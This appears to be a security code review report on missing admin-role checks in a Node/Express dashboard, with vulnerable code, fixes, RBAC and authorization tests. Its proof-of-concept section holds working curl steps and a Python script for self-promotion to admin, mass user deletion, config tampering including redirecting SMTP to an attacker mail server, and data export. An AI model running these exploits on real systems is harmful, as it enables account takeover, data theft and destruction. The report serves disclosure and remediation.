# Security Code Review Report

## Target Information
- **Domain**: admin.example.com
- **Review Date**: 2024-11-14
- **Reviewer**: Security Team
- **Repository**: https://github.com/example/admin-dashboard
- **Commit Hash**: 9f2e6a3d7c5b8e1a4f9d2b7c5e8a3d6f9b4e2c7a

---

## Executive Summary

This report identifies critical Broken Function Level Access Control vulnerabilities in the admin dashboard at admin.example.com. The application fails to properly enforce authorization checks on administrative functions, allowing regular users to perform privileged operations by directly accessing admin API endpoints.

---

## Vulnerability Details

### 1. Missing Function-Level Access Control on Admin APIs

**Severity**: CRITICAL
**CWE**: CWE-285 (Improper Authorization), CWE-862 (Missing Authorization)
**CVSS Score**: 9.1
**File**: `routes/admin/users.js:34`
**Git Commit**: 9f2e6a3d7c5b8e1a4f9d2b7c5e8a3d6f9b4e2c7a

#### Description
The admin API endpoints check if a user is authenticated but fail to verify if the user has admin privileges. This allows any authenticated user (including low-privilege accounts) to access administrative functions such as user management, system configuration, and data export.

#### Vulnerable Code
```javascript
// routes/admin/users.js

const express = require('express');
const router = express.Router();
const User = require('../models/User');
const { authMiddleware } = require('../middleware/auth');

// VULNERABLE: Only checks authentication, not authorization
router.get('/api/admin/users', authMiddleware, async (req, res) => {
    // MISSING: Check if req.user.role === 'admin'

    try {
        const users = await User.find({}).select('-password');
        res.json({ users });
    } catch (error) {
        res.status(500).json({ error: 'Server error' });
    }
});

router.delete('/api/admin/users/:userId', authMiddleware, async (req, res) => {
    // VULNERABLE: No admin role check
    const { userId } = req.params;

    try {
        await User.findByIdAndDelete(userId);
        res.json({ success: true, message: 'User deleted' });
    } catch (error) {
        res.status(500).json({ error: 'Server error' });
    }
});

router.put('/api/admin/users/:userId/promote', authMiddleware, async (req, res) => {
    // CRITICAL: Any user can promote themselves to admin!
    const { userId } = req.params;

    try {
        const user = await User.findByIdAndUpdate(
            userId,
            { role: 'admin' },
            { new: true }
        );

        res.json({ success: true, user });
    } catch (error) {
        res.status(500).json({ error: 'Server error' });
    }
});

// System configuration endpoints
router.post('/api/admin/config', authMiddleware, async (req, res) => {
    // VULNERABLE: No role check on critical configuration changes
    const { key, value } = req.body;

    await SystemConfig.update({ key }, { value });
    res.json({ success: true });
});
```

```javascript
// middleware/auth.js

const jwt = require('jsonwebtoken');

const authMiddleware = (req, res, next) => {
    const token = req.headers.authorization?.split(' ')[1];

    if (!token) {
        return res.status(401).json({ error: 'No token provided' });
    }

    try {
        const decoded = jwt.verify(token, process.env.JWT_SECRET);
        req.user = decoded;
        // MISSING: No role-based access control
        next();
    } catch (error) {
        return res.status(401).json({ error: 'Invalid token' });
    }
};
```

#### Proof of Concept

**1. Privilege Escalation - Self-Promotion to Admin:**
```bash
# Step 1: Register as normal user
curl -X POST https://admin.example.com/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{
    "username": "attacker",
    "email": "attacker@evil.com",
    "password": "Password123"
  }'

# Step 2: Login and get token
TOKEN=$(curl -X POST https://admin.example.com/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{
    "username": "attacker",
    "password": "Password123"
  }' | jq -r '.token')

# Step 3: Get user ID
USER_ID=$(curl -X GET https://admin.example.com/api/user/profile \
  -H "Authorization: Bearer $TOKEN" | jq -r '.id')

# Step 4: Promote self to admin (CRITICAL VULNERABILITY)
curl -X PUT "https://admin.example.com/api/admin/users/${USER_ID}/promote" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json"

# Result: Regular user is now admin!
```

**2. Unauthorized User Enumeration:**
```bash
# List all users (including admins, emails, personal info)
curl -X GET https://admin.example.com/api/admin/users \
  -H "Authorization: Bearer $REGULAR_USER_TOKEN"

# Response reveals sensitive data:
{
  "users": [
    {"id": "1", "username": "admin", "email": "admin@example.com", "role": "admin"},
    {"id": "2", "username": "john", "email": "john@example.com", "role": "user"},
    ...
  ]
}
```

**3. Delete Any User Account:**
```bash
# Delete admin account as regular user
curl -X DELETE https://admin.example.com/api/admin/users/1 \
  -H "Authorization: Bearer $REGULAR_USER_TOKEN"

# Delete all other users
for id in {1..100}; do
  curl -X DELETE "https://admin.example.com/api/admin/users/${id}" \
    -H "Authorization: Bearer $REGULAR_USER_TOKEN"
done
```

**4. Modify System Configuration:**
```bash
# Change critical system settings
curl -X POST https://admin.example.com/api/admin/config \
  -H "Authorization: Bearer $REGULAR_USER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "key": "maintenance_mode",
    "value": "true"
  }'

# Disable security features
curl -X POST https://admin.example.com/api/admin/config \
  -H "Authorization: Bearer $REGULAR_USER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "key": "rate_limiting_enabled",
    "value": "false"
  }'

# Change SMTP settings to intercept emails
curl -X POST https://admin.example.com/api/admin/config \
  -H "Authorization: Bearer $REGULAR_USER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "key": "smtp_host",
    "value": "attacker-mail-server.com"
  }'
```

**5. Export All User Data:**
```bash
# Export database (if endpoint exists without proper auth)
curl -X GET https://admin.example.com/api/admin/export/users \
  -H "Authorization: Bearer $REGULAR_USER_TOKEN" \
  -o all_users.csv

curl -X GET https://admin.example.com/api/admin/export/transactions \
  -H "Authorization: Bearer $REGULAR_USER_TOKEN" \
  -o all_transactions.csv
```

**6. Access System Logs:**
```bash
# View system logs (may contain sensitive info)
curl -X GET https://admin.example.com/api/admin/logs \
  -H "Authorization: Bearer $REGULAR_USER_TOKEN"

# View audit trail
curl -X GET https://admin.example.com/api/admin/audit \
  -H "Authorization: Bearer $REGULAR_USER_TOKEN"
```

**7. Automated Exploitation Script:**
```python
#!/usr/bin/env python3
import requests
import json

BASE_URL = "https://admin.example.com"

def register_user(username, email, password):
    """Register a new user"""
    url = f"{BASE_URL}/api/auth/register"
    data = {
        "username": username,
        "email": email,
        "password": password
    }
    response = requests.post(url, json=data)
    return response.json()

def login(username, password):
    """Login and get token"""
    url = f"{BASE_URL}/api/auth/login"
    data = {"username": username, "password": password}
    response = requests.post(url, json=data)
    return response.json().get('token')

def get_profile(token):
    """Get user profile"""
    url = f"{BASE_URL}/api/user/profile"
    headers = {"Authorization": f"Bearer {token}"}
    response = requests.get(url, headers=headers)
    return response.json()

def promote_to_admin(token, user_id):
    """Exploit: Promote user to admin"""
    url = f"{BASE_URL}/api/admin/users/{user_id}/promote"
    headers = {"Authorization": f"Bearer {token}"}
    response = requests.put(url, headers=headers)
    return response.json()

def list_all_users(token):
    """List all users (admin function accessible to regular user)"""
    url = f"{BASE_URL}/api/admin/users"
    headers = {"Authorization": f"Bearer {token}"}
    response = requests.get(url, headers=headers)
    return response.json()

def delete_user(token, user_id):
    """Delete a user"""
    url = f"{BASE_URL}/api/admin/users/{user_id}"
    headers = {"Authorization": f"Bearer {token}"}
    response = requests.delete(url, headers=headers)
    return response.json()

# Main exploitation flow
print("[*] Starting privilege escalation attack...")

# Create regular user account
print("[*] Registering new user...")
register_user("hacker", "hacker@evil.com", "Password123")

# Login
print("[*] Logging in...")
token = login("hacker", "Password123")
print(f"[+] Token obtained: {token[:20]}...")

# Get user ID
print("[*] Getting user profile...")
profile = get_profile(token)
user_id = profile['id']
print(f"[+] User ID: {user_id}, Role: {profile['role']}")

# Escalate privileges
print("[*] Attempting privilege escalation...")
result = promote_to_admin(token, user_id)
print(f"[+] Privilege escalation result: {result}")

# Verify admin access
print("[*] Verifying admin access by listing all users...")
users = list_all_users(token)
print(f"[+] Successfully accessed admin function! Found {len(users.get('users', []))} users")

print("[*] Attack successful! Regular user now has admin privileges.")
```

#### Impact
- **Complete System Compromise**: Full administrative access
- **Privilege Escalation**: Any user can become admin
- **Mass Data Breach**: Access to all user data
- **Service Disruption**: Ability to delete users, modify config
- **Account Takeover**: Delete legitimate admins
- **Compliance Violations**: Unauthorized access to PII
- **Reputational Damage**: Complete security failure

#### Attack Scenarios

**Scenario 1: Insider Threat**
1. Disgruntled employee with regular account
2. Promotes themselves to admin
3. Exports all customer data
4. Deletes audit logs
5. Creates backdoor admin accounts

**Scenario 2: External Attacker**
1. Compromises single user account (phishing)
2. Escalates to admin via API
3. Takes over entire system
4. Deploys ransomware or exfiltrates data

#### Remediation

**Comprehensive Authorization Implementation:**

```javascript
// middleware/auth.js - SECURE VERSION

const jwt = require('jsonwebtoken');
const User = require('../models/User');

// Authentication middleware
const authMiddleware = async (req, res, next) => {
    const token = req.headers.authorization?.split(' ')[1];

    if (!token) {
        return res.status(401).json({ error: 'No token provided' });
    }

    try {
        const decoded = jwt.verify(token, process.env.JWT_SECRET);

        // Fetch fresh user data from database
        const user = await User.findById(decoded.userId).select('-password');

        if (!user) {
            return res.status(401).json({ error: 'User not found' });
        }

        req.user = user;
        next();
    } catch (error) {
        return res.status(401).json({ error: 'Invalid token' });
    }
};

// Authorization middleware - Check for admin role
const requireAdmin = (req, res, next) => {
    if (!req.user || req.user.role !== 'admin') {
        return res.status(403).json({
            error: 'Access denied. Admin privileges required.'
        });
    }
    next();
};

// Permission-based authorization
const requirePermission = (permission) => {
    return (req, res, next) => {
        if (!req.user || !req.user.permissions.includes(permission)) {
            return res.status(403).json({
                error: `Access denied. ${permission} permission required.`
            });
        }
        next();
    };
};

module.exports = { authMiddleware, requireAdmin, requirePermission };
```

```javascript
// routes/admin/users.js - SECURE VERSION

const express = require('express');
const router = express.Router();
const User = require('../models/User');
const { authMiddleware, requireAdmin } = require('../middleware/auth');
const { logAuditEvent } = require('../utils/audit');

// SECURE: Requires both authentication AND admin authorization
router.get('/api/admin/users', authMiddleware, requireAdmin, async (req, res) => {
    try {
        const users = await User.find({}).select('-password');

        // Log admin action
        await logAuditEvent({
            userId: req.user.id,
            action: 'LIST_USERS',
            timestamp: new Date()
        });

        res.json({ users });
    } catch (error) {
        res.status(500).json({ error: 'Server error' });
    }
});

router.delete('/api/admin/users/:userId', authMiddleware, requireAdmin, async (req, res) => {
    const { userId } = req.params;

    try {
        // Prevent deleting yourself
        if (userId === req.user.id) {
            return res.status(400).json({ error: 'Cannot delete your own account' });
        }

        // Prevent deleting super admin
        const targetUser = await User.findById(userId);
        if (targetUser.role === 'super_admin') {
            return res.status(403).json({ error: 'Cannot delete super admin' });
        }

        await User.findByIdAndDelete(userId);

        // Log admin action
        await logAuditEvent({
            userId: req.user.id,
            action: 'DELETE_USER',
            targetUserId: userId,
            timestamp: new Date()
        });

        res.json({ success: true, message: 'User deleted' });
    } catch (error) {
        res.status(500).json({ error: 'Server error' });
    }
});

router.put('/api/admin/users/:userId/promote', authMiddleware, requireAdmin, async (req, res) => {
    const { userId } = req.params;

    try {
        // SECURE: Only super_admin can promote to admin
        if (req.user.role !== 'super_admin') {
            return res.status(403).json({
                error: 'Only super admin can promote users to admin'
            });
        }

        // Prevent self-promotion
        if (userId === req.user.id) {
            return res.status(400).json({ error: 'Cannot modify your own role' });
        }

        const user = await User.findByIdAndUpdate(
            userId,
            { role: 'admin' },
            { new: true }
        );

        // Log critical action
        await logAuditEvent({
            userId: req.user.id,
            action: 'PROMOTE_USER_TO_ADMIN',
            targetUserId: userId,
            timestamp: new Date(),
            severity: 'HIGH'
        });

        res.json({ success: true, user });
    } catch (error) {
        res.status(500).json({ error: 'Server error' });
    }
});

module.exports = router;
```

**Role-Based Access Control (RBAC) Model:**

```javascript
// models/User.js - Enhanced with roles and permissions

const userSchema = new Schema({
    username: { type: String, required: true, unique: true },
    email: { type: String, required: true, unique: true },
    password: { type: String, required: true },
    role: {
        type: String,
        enum: ['user', 'moderator', 'admin', 'super_admin'],
        default: 'user'
    },
    permissions: [{
        type: String,
        enum: [
            'read_users',
            'create_users',
            'update_users',
            'delete_users',
            'manage_roles',
            'view_logs',
            'export_data',
            'system_config'
        ]
    }],
    createdAt: { type: Date, default: Date.now },
    modifiedBy: { type: Schema.Types.ObjectId, ref: 'User' }
});

// Middleware to set permissions based on role
userSchema.pre('save', function(next) {
    if (this.isModified('role')) {
        switch(this.role) {
            case 'super_admin':
                this.permissions = [
                    'read_users', 'create_users', 'update_users',
                    'delete_users', 'manage_roles', 'view_logs',
                    'export_data', 'system_config'
                ];
                break;
            case 'admin':
                this.permissions = [
                    'read_users', 'create_users', 'update_users',
                    'delete_users', 'view_logs'
                ];
                break;
            case 'moderator':
                this.permissions = ['read_users', 'update_users'];
                break;
            default:
                this.permissions = [];
        }
    }
    next();
});
```

---

## Additional Findings

### 2. Client-Side Role Checking

**Severity**: HIGH
**File**: `frontend/components/AdminPanel.jsx`

The frontend hides admin UI elements based on user role, but backend doesn't enforce authorization.

**Impact**: Attackers bypass UI restrictions by calling APIs directly.

**Remediation**: Always enforce authorization on the backend, never rely on frontend checks.

### 3. No Audit Logging

**Severity**: MEDIUM

The application doesn't log administrative actions, making breach detection impossible.

**Remediation**: Implement comprehensive audit logging for all sensitive operations.

---

## Recommendations

1. **Immediate Actions** (within 4 hours):
   - Add admin authorization checks to all admin endpoints
   - Review user accounts for unauthorized privilege escalations
   - Review audit logs (if any) for suspicious admin actions
   - Demote any unauthorized admin accounts
   - Force password reset for all admin accounts

2. **Short-term Actions** (within 1 week):
   - Implement RBAC across all endpoints
   - Add comprehensive audit logging
   - Implement automated authorization testing
   - Review all API endpoints for missing access controls
   - Add monitoring and alerting for privilege changes

3. **Long-term Improvements**:
   - Implement policy-based access control (PBAC)
   - Regular access control audits
   - Automated security testing in CI/CD
   - Penetration testing
   - Security awareness training
   - Implement principle of least privilege

---

## Testing Authorization

**Automated test suite:**
```javascript
// tests/authorization.test.js

describe('Admin Authorization Tests', () => {
    let regularUserToken;
    let adminToken;

    beforeAll(async () => {
        // Create test users
        const regularUser = await createUser({ role: 'user' });
        const adminUser = await createUser({ role: 'admin' });

        regularUserToken = generateToken(regularUser);
        adminToken = generateToken(adminUser);
    });

    test('Regular user cannot access admin user list', async () => {
        const response = await request(app)
            .get('/api/admin/users')
            .set('Authorization', `Bearer ${regularUserToken}`);

        expect(response.status).toBe(403);
    });

    test('Regular user cannot delete users', async () => {
        const response = await request(app)
            .delete('/api/admin/users/123')
            .set('Authorization', `Bearer ${regularUserToken}`);

        expect(response.status).toBe(403);
    });

    test('Regular user cannot promote themselves', async () => {
        const userId = decodeToken(regularUserToken).userId;
        const response = await request(app)
            .put(`/api/admin/users/${userId}/promote`)
            .set('Authorization', `Bearer ${regularUserToken}`);

        expect(response.status).toBe(403);
    });

    test('Admin can access user list', async () => {
        const response = await request(app)
            .get('/api/admin/users')
            .set('Authorization', `Bearer ${adminToken}`);

        expect(response.status).toBe(200);
    });
});
```

---

## Timeline
- **Discovery**: 2024-11-12
- **Verification**: 2024-11-13
- **Report Delivered**: 2024-11-14
- **Expected Fix**: IMMEDIATE (Critical Priority - within 4 hours)

---

## References
- OWASP Broken Access Control: https://owasp.org/Top10/A01_2021-Broken_Access_Control/
- CWE-285: https://cwe.mitre.org/data/definitions/285.html
- CWE-862: https://cwe.mitre.org/data/definitions/862.html
- OWASP Authorization Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html
